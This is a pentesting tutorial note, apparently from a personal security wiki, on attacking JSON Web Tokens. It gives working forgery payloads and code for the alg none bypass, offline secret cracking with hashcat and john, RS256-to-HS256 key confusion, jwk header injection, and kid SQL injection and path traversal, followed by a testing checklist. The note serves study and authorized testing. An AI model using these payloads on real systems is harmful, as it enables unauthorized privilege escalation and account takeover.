# JWT Attacks

← [[A07-Auth-Failures]]

---

JWTs (JSON Web Tokens) are used everywhere for auth — API tokens, session tokens, OAuth access tokens. When they're misconfigured or the secret is weak, you can forge tokens with arbitrary payloads, including elevated privileges.

---

## JWT Structure

A JWT has three base64url-encoded parts separated by dots:

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0IiwicGxlIjoidXNlciJ9.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
        ^header                                  ^payload                        ^signature
```

Decode in Burp Decoder or `jwt.io`:

```json
// Header
{"alg": "HS256", "typ": "JWT"}

// Payload
{"sub": "1234", "role": "user", "exp": 1719878400}

// Signature = HMAC_SHA256(base64(header) + "." + base64(payload), secret)
```

---

## Attack 1 — Algorithm: None

Some libraries accept `"alg": "none"` and skip signature verification entirely.

```python
# Original header
{"alg": "HS256", "typ": "JWT"}

# Modified header
{"alg": "none", "typ": "JWT"}

# Modified payload (escalate to admin)
{"sub": "1234", "role": "admin", "exp": 9999999999}

# New token (no signature = just remove it, keep trailing dot)
base64url(header) + "." + base64url(payload) + "."
```

**Variations to try:**
```
"alg": "none"
"alg": "None"
"alg": "NONE"
"alg": "nOnE"
```

---

## Attack 2 — Weak HMAC Secret (HS256)

If the secret is weak (short, common word), crack it offline:

```bash
# hashcat — fastest
hashcat -a 0 -m 16500 eyJ...token...here /usr/share/wordlists/rockyou.txt

# john
john --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA256 jwt.txt
```

With the secret, forge any token you want:

```python
import jwt
# Sign with cracked secret
token = jwt.encode({"sub": "admin", "role": "admin"}, "crackedsecret", algorithm="HS256")
```

---

## Attack 3 — Algorithm Confusion (RS256 → HS256)

When the server uses RS256 (asymmetric), it signs with the **private key** and verifies with the **public key**.

If you trick the server into using HS256 (symmetric) instead, it will use the public key as the HMAC secret — and the public key is, well, public.

```python
# 1. Get the server's public key (from /jwks.json, /.well-known/openid-configuration, or from a valid token)
# 2. Change header alg from RS256 to HS256
# 3. Sign the modified payload with the public key as the HS256 secret

import jwt
public_key = open("public_key.pem").read()

token = jwt.encode(
    {"sub": "admin", "role": "admin"},
    public_key,
    algorithm="HS256"
)
```

**Check for public key exposure:**
```bash
curl https://example.com/jwks.json
curl https://example.com/.well-known/jwks.json
curl https://example.com/api/auth/jwks
```

---

## Attack 4 — jwk Header Injection

The `jwk` header parameter is meant to provide the key used to verify the token. If the server trusts whatever key is in the `jwk` header:

```json
{
  "alg": "RS256",
  "typ": "JWT",
  "jwk": {
    "kty": "RSA",
    "n": "your_generated_modulus",
    "e": "AQAB"
  }
}
```

Generate an RSA key pair, embed your public key in the `jwk` header, sign the payload with your private key. If the server trusts the embedded key — arbitrary claims accepted.

**Using JWT Editor (Burp Extension):**
- Generate RSA key pair in JWT Editor
- Modify the payload
- Attack → Embedded JWK

---

## Attack 5 — kid Header SQL/Path Injection

The `kid` (Key ID) header tells the server which key to use for verification. If it's used in a DB query or file path without sanitization:

```json
// SQL injection via kid
{"alg": "HS256", "kid": "' UNION SELECT 'attacker_secret'-- -"}
```

Now the server uses `attacker_secret` as the key, which you know — so you can forge tokens.

```json
// Path traversal via kid
{"alg": "HS256", "kid": "../../dev/null"}
```

Sign with an empty string (contents of `/dev/null`).

---

## Attack 6 — Expired Token Accepted

Try submitting an expired token — some apps don't validate the `exp` claim.

---

## Testing JWTs in Burp

**JWT Editor extension:**
1. Install JWT Editor from BApp Store
2. In Proxy History, find a request with a JWT
3. Go to the JWT Editor tab in the request
4. Modify the payload
5. Try each attack type

**Manual with CyberChef / jwt.io:**
1. Decode the JWT
2. Modify the payload
3. Re-encode without the signature (alg: none test)

---

## Checklist

- [ ] `alg: none` accepted?
- [ ] Algorithm can be changed from RS256 to HS256?
- [ ] Weak secret — crackable with rockyou?
- [ ] `jwk` header trusted without validation?
- [ ] `kid` parameter injectable?
- [ ] Expired tokens still accepted?
- [ ] `sub` or `role` claims changeable without signature invalidation?

---

*Related: [[A07-Auth-Failures]] | [[HTTP-Cookies-and-Sessions]]*

*Sources: PortSwigger Web Security Academy, jwt.io, PayloadsAllTheThings*
